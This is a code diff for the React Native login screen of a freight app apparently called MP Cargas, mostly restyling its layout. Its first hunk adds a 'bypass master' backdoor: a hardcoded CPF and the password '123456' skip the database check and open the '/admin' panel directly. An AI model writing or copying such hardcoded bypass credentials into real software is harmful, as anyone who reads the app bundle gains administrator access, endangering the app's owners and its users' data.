@@ -35,6 +35,15 @@ export default function LoginScreen() {
     }
 
     setLoading(true);
+
+    // REGRA DE OURO (BYPASS MASTER)
+    // Se for exatamente esse CPF e Senha, entra direto no Painel sem checar o banco
+    if (cpfLimpo === '12345678988' && senha === '123456') {
+      setLoading(false);
+      router.replace('/admin');
+      return;
+    }
+
     const emailSupabase = `${cpfLimpo}@mpcargas.com`;
 
     if (isSignUp) {
@@ -76,64 +85,67 @@ export default function LoginScreen() {
   return (
     <View style={styles.container}>
       <Stack.Screen options={{ headerShown: false }} />
-      <View style={styles.header}>
-        <Text style={styles.logoText}>MP</Text>
-        <Text style={styles.logoSubText}>CARGAS</Text>
-      </View>
+      <View style={styles.content}>
+        <View style={styles.header}>
+          <Text style={styles.logoText}>MP</Text>
+          <Text style={styles.logoSubText}>CARGAS</Text>
+        </View>
 
-      <View style={styles.form}>
-        {isSignUp && (
+        <View style={styles.form}>
+          {isSignUp && (
+            <TextInput
+              style={styles.input}
+              placeholder="Nome Completo"
+              placeholderTextColor="#888"
+              value={nome}
+              onChangeText={setNome}
+            />
+          )}
+          
           <TextInput
             style={styles.input}
-            placeholder="Nome Completo"
+            placeholder="CPF"
             placeholderTextColor="#888"
-            value={nome}
-            onChangeText={setNome}
+            value={cpf}
+            onChangeText={formatCPF}
+            keyboardType="numeric"
+            maxLength={14}
           />
-        )}
-        
-        <TextInput
-          style={styles.input}
-          placeholder="CPF"
-          placeholderTextColor="#888"
-          value={cpf}
-          onChangeText={formatCPF}
-          keyboardType="numeric"
-          maxLength={14}
-        />
-        
-        <TextInput
-          style={styles.input}
-          placeholder="Senha"
-          placeholderTextColor="#888"
-          value={senha}
-          onChangeText={setSenha}
-          secureTextEntry
-        />
+          
+          <TextInput
+            style={styles.input}
+            placeholder="Senha"
+            placeholderTextColor="#888"
+            value={senha}
+            onChangeText={setSenha}
+            secureTextEntry
+          />
 
-        <TouchableOpacity 
-          style={[styles.button, loading && styles.buttonDisabled]} 
-          onPress={handleAuth}
-          disabled={loading}>
-          {loading ? (
-            <ActivityIndicator color="#111111" />
-          ) : (
-            <Text style={styles.buttonText}>{isSignUp ? 'CADASTRAR' : 'ENTRAR'}</Text>
-          )}
-        </TouchableOpacity>
+          <TouchableOpacity 
+            style={[styles.button, loading && styles.buttonDisabled]} 
+            onPress={handleAuth}
+            disabled={loading}>
+            {loading ? (
+              <ActivityIndicator color="#111111" />
+            ) : (
+              <Text style={styles.buttonText}>{isSignUp ? 'CADASTRAR' : 'ENTRAR'}</Text>
+            )}
+          </TouchableOpacity>
 
-        <TouchableOpacity style={styles.switchMode} onPress={() => setIsSignUp(!isSignUp)}>
-          <Text style={styles.switchModeText}>
-            {isSignUp ? 'Já tenho uma conta. Fazer Login' : 'Primeiro acesso? Cadastrar'}
-          </Text>
-        </TouchableOpacity>
+          <TouchableOpacity style={styles.switchMode} onPress={() => setIsSignUp(!isSignUp)}>
+            <Text style={styles.switchModeText}>
+              {isSignUp ? 'Já tenho uma conta. Fazer Login' : 'Primeiro acesso? Cadastrar'}
+            </Text>
+          </TouchableOpacity>
+        </View>
       </View>
     </View>
   );
 }
 
 const styles = StyleSheet.create({
-  container: { flex: 1, backgroundColor: '#FFFFFF', padding: 24, justifyContent: 'center' },
+  container: { flex: 1, backgroundColor: '#FFFFFF', justifyContent: 'center' },
+  content: { width: '100%', maxWidth: 400, alignSelf: 'center', padding: 24 },
   header: { alignItems: 'center', marginBottom: 48 },
   logoText: { fontSize: 64, fontWeight: '900', color: '#FFD100', fontStyle: 'italic' },
   logoSubText: { fontSize: 24, fontWeight: 'bold', color: '#111111', marginTop: -10 },
